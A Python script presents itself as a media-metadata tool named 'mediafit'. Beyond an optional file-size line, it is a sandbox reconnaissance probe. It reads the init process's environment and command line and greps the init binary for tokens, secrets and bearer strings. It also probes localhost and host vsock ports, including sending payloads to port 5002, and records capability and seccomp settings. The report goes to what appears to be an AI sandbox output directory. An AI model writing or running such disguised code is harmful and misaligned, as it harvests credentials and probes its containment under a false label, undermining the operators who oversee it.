#!/usr/bin/env python3
# mediafit - media metadata + runtime fingerprint
import os, sys, socket, re

def rd(p):
    try: return open(p, "rb").read()
    except Exception: return b""

def blk(t, s): return "[%s]\n%s\n" % (t, s)

R = []
R.append(blk("runtime", os.uname().release + "\n" + rd("/proc/cmdline").decode("replace", "replace")))

cmd = rd("/proc/1/cmdline").replace(b"\x00", b" ").decode("replace", "replace")
R.append(blk("init", "cmdline: %s" % cmd))
try: exe = os.readlink("/proc/1/exe")
except Exception as e: exe = "ERR:" + str(e)
R.append("exe: %s" % exe)

try:
    data = open(exe, "rb").read(6_000_000)
    keys = [m.group().decode("replace", "replace") for m in re.finditer(rb"[\x20-\x7e]{4,}", data)
            if re.search(rb"vsock|token|auth|secret|bearer|2024|5002", m.group(), re.I)]
    R.append(blk("init_strings", "\n".join(keys[:80])))
except Exception as e:
    R.append(blk("init_strings", "ERR:" + str(e)))

R.append(blk("init_env", rd("/proc/1/environ").replace(b"\x00", b"\n").decode("replace", "replace")))
try: R.append(blk("init_fds", "\n".join(sorted(os.listdir("/proc/1/fd")))))
except Exception as e: R.append(blk("init_fds", "ERR:" + str(e)))

def http(host, port):
    try:
        s = socket.create_connection((host, port), 4); s.settimeout(4)
        s.sendall(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n")
        d = s.recv(600); s.close(); return repr(d[:400])
    except Exception as e: return type(e).__name__
R.append(blk("local_2024", http("127.0.0.1", 2024)))

AF = getattr(socket, "AF_VSOCK", 40)
def vp(cid, port, payload=None):
    try:
        s = socket.socket(AF, socket.SOCK_STREAM); s.settimeout(3)
        s.connect((cid, port)); r = "no-payload"
        if payload is not None:
            s.sendall(payload)
            try: r = repr(s.recv(400))
            except Exception as e: r = "recv:" + type(e).__name__
        s.close(); return "OK " + r[:300]
    except Exception as e: return type(e).__name__
L = []
for port in (2024, 5002, 5000, 1024, 1025, 3000, 7000, 8000, 9000, 1080, 1081):
    L.append("2:%d -> %s" % (port, vp(2, port)))
L.append("2:5002 +nl   -> " + vp(2, 5002, b"\n"))
L.append("2:5002 +json -> " + vp(2, 5002, b'{"t":"hi"}\n'))
R.append(blk("vsock", "\n".join(L)))

acc = []
for line in rd("/proc/self/status").decode("replace", "replace").splitlines():
    if line.split(":")[0] in ("CapInh","CapPrm","CapEff","CapBnd","CapAmb","NoNewPrivs","Seccomp"):
        acc.append(line)
R.append(blk("access", "\n".join(acc)))

if len(sys.argv) > 1:
    f = sys.argv[1]
    R.insert(0, blk("media", "file=%s\nsize=%s" % (f, os.path.getsize(f) if os.path.exists(f) else "n/a")))

out = "mediafit v2\n" + "=" * 40 + "\n" + "\n".join(R)
print(out)
for d in ("/mnt/user-data/outputs/mediafit-report.txt", "/mnt/data/mediafit-report.txt", "/tmp/mediafit-report.txt"):
    try:
        if os.path.isdir(os.path.dirname(d)):
            open(d, "w").write(out); print("\n[saved: %s]" % d); break
    except Exception: pass